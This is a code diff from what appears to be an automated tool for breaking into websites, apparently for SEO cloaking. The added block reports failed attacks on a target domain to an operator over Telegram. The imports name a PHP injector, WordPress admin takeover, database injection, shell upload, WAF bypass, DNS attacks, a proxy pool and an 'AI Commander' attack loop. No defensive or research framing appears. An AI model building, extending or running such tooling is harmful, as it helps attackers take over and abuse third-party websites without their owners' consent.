@@ -24,7 +24,7 @@ import { generateCloakingPackage, type CloakingConfig, type CloakingShell as Clo
 import { generateContentPack, type ContentConfig, type ContentPack } from "./cloaking-content-engine";
 import { executeInjection, type InjectionConfig, type InjectionResult } from "./php-injector";
 import { uploadContentToCdn, type CdnUploadResult } from "./content-cdn";
-import { sendTelegramNotification, sendVulnAlert, sendAttackSuccessAlert, type TelegramNotification } from "./telegram-notifier";
+import { sendTelegramNotification, sendVulnAlert, sendAttackSuccessAlert, sendFailureSummaryAlert, type TelegramNotification, type MethodAttempt } from "./telegram-notifier";
 import { runWpAdminTakeover, runShellExecFallback, type WpAdminConfig, type WpTakeoverResult } from "./wp-admin-takeover";
 import { runWpDbInjection, type WpDbInjectionConfig, type WpDbInjectionResult } from "./wp-db-injection";
 import { proxyPool, fetchWithPoolProxy } from "./proxy-pool";
@@ -3746,6 +3746,97 @@ export async function runUnifiedAttackPipeline(
       progress: 100,
       data: result,
     });
+  }
+
+  // ─── Failure Summary Alert ───
+  if (!fullSuccess && !partialSuccess && !fileDeployed) {
+    // Build method attempts from errors and phases
+    const pipelineMethodAttempts: MethodAttempt[] = [];
+    // Add upload attempts
+    if (totalAttempts > 0) {
+      pipelineMethodAttempts.push({
+        name: "Shell Upload",
+        status: "failed",
+        reason: `${totalAttempts} ครั้ง, ${shells.length} shells`,
+        durationMs: result.totalDuration,
+      });
+    }
+    // Add WAF bypass results
+    if (wafBypassResults.length > 0) {
+      const wafSuccess = wafBypassResults.some((r: any) => r.success);
+      pipelineMethodAttempts.push({
+        name: "WAF Bypass",
+        status: wafSuccess ? "failed" : "failed",
+        reason: `${wafBypassResults.length} วิธีลอง`,
+      });
+    }
+    // Add alt upload results
+    if (altUploadResults.length > 0) {
+      pipelineMethodAttempts.push({
+        name: "Alt Upload",
+        status: "failed",
+        reason: `${altUploadResults.length} วิธีลอง`,
+      });
+    }
+    // Add indirect attack results
+    if (indirectResults.length > 0) {
+      pipelineMethodAttempts.push({
+        name: "Indirect Attack",
+        status: "failed",
+        reason: `${indirectResults.length} วิธีลอง`,
+      });
+    }
+    // Add DNS attack results
+    if (dnsResults.length > 0) {
+      pipelineMethodAttempts.push({
+        name: "DNS Attack",
+        status: "failed",
+        reason: `${dnsResults.length} วิธีลอง`,
+      });
+    }
+    // Add config exploit results
+    if (configResults.length > 0) {
+      pipelineMethodAttempts.push({
+        name: "Config Exploit",
+        status: "failed",
+        reason: `${configResults.length} วิธีลอง`,
+      });
+    }
+    // Add shellless results
+    if (shelllessResults.length > 0) {
+      pipelineMethodAttempts.push({
+        name: "Shellless Attack",
+        status: "failed",
+        reason: `${shelllessResults.length} วิธีลอง`,
+      });
+    }
+    // Add AI Commander result
+    if (aiCommanderResult) {
+      pipelineMethodAttempts.push({
+        name: "AI Commander",
+        status: aiCommanderResult.success ? "failed" : "failed",
+        reason: `${aiCommanderResult.iterations} iterations`,
+        durationMs: aiCommanderResult.totalDurationMs,
+      });
+    }
+    // Add errors as context
+    if (errors.length > 0 && pipelineMethodAttempts.length === 0) {
+      pipelineMethodAttempts.push({
+        name: "Pipeline",
+        status: "error",
+        reason: errors.slice(0, 2).join("; ").substring(0, 60),
+        durationMs: result.totalDuration,
+      });
+    }
+    sendFailureSummaryAlert({
+      domain: config.targetUrl,
+      mode: "pipeline",
+      totalDurationMs: result.totalDuration,
+      methods: pipelineMethodAttempts,
+      serverInfo: prescreen?.serverType || vulnScan?.serverInfo?.server,
+      cms: vulnScan?.cms?.type,
+      vulnCount: vulnScan ? (vulnScan.misconfigurations?.length || 0) + (vulnScan.cms?.vulnerableComponents?.length || 0) : undefined,
+    }).catch(err => console.warn(`[Pipeline] Failure summary alert failed: ${err}`));
   }
 
   // ─── Attack Success Alert (separate from Telegram notification) ───
